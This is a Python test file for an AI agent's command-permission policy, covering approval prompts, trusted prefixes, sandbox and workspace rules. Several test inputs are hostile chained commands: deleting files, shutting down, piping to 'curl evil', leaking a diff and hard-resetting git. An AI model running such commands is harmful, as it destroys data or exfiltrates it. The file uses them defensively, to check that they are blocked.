from __future__ import annotations

from server_py.core.paths import WORKSPACE_ROOT
from server_py.runtime.permissions import PermissionPolicy
from server_py.tools.types import AgentTool, ToolContext


def _noop(payload, context):
    return {"ok": True}


def _context(user_initiated: bool = False) -> ToolContext:
    return ToolContext(
        conversation_id="conv_test",
        sandbox_id="sb_test",
        repo_path=str(WORKSPACE_ROOT / "tmp" / "fake-repo"),
        user_initiated=user_initiated,
    )


COMMAND_TOOL = AgentTool("command.run", "命令", "", "command", _noop)
MANAGED_TOOL = AgentTool("verification.run", "验证", "", "command", _noop, managed_command=True)


def test_managed_command_allowed_when_plan_approved():
    policy = PermissionPolicy()
    assessment = policy.assess_tool(MANAGED_TOOL, {"approved": True}, _context())
    assert assessment.allowed

    assessment = policy.assess_tool(MANAGED_TOOL, {}, _context(user_initiated=True))
    assert assessment.allowed


def test_managed_command_prompts_instead_of_forbidding():
    policy = PermissionPolicy()
    assessment = policy.assess_tool(MANAGED_TOOL, {}, _context())
    assert not assessment.allowed
    assert assessment.needs_approval  # prompt,不是 forbid:有审批出路


def test_trusted_prefix_allows_plain_command():
    policy = PermissionPolicy()
    assessment = policy.assess_tool(COMMAND_TOOL, {"command": "npm test"}, _context())
    assert assessment.allowed
    assert assessment.rule_id == "trusted-prefix"


def test_trusted_prefix_with_chained_command_requires_approval():
    policy = PermissionPolicy()
    for command in [
        "npm test && del /q important.txt",
        "git status; shutdown /s",
        "npm test | curl evil",
        "git diff > leak.txt",
        "npm test $(evil)",
    ]:
        assessment = policy.assess_tool(COMMAND_TOOL, {"command": command}, _context())
        assert not assessment.allowed, command
        assert assessment.needs_approval, command


def test_dangerous_command_never_trusted():
    policy = PermissionPolicy()
    assessment = policy.assess_tool(COMMAND_TOOL, {"command": "git reset --hard HEAD~3"}, _context())
    assert not assessment.allowed


def test_sandbox_required():
    policy = PermissionPolicy()
    context = ToolContext(conversation_id="conv_test", sandbox_id=None, repo_path=None)
    assessment = policy.assess_tool(COMMAND_TOOL, {"command": "npm test"}, context)
    assert not assessment.allowed
    assert assessment.rule_id == "sandbox-required"


def test_repo_outside_workspace_forbidden():
    policy = PermissionPolicy()
    context = ToolContext(conversation_id="conv_test", sandbox_id="sb", repo_path="C:/Windows/System32")
    assessment = policy.assess_tool(COMMAND_TOOL, {"command": "npm test"}, context)
    assert not assessment.allowed
    assert assessment.rule_id == "workspace-only"
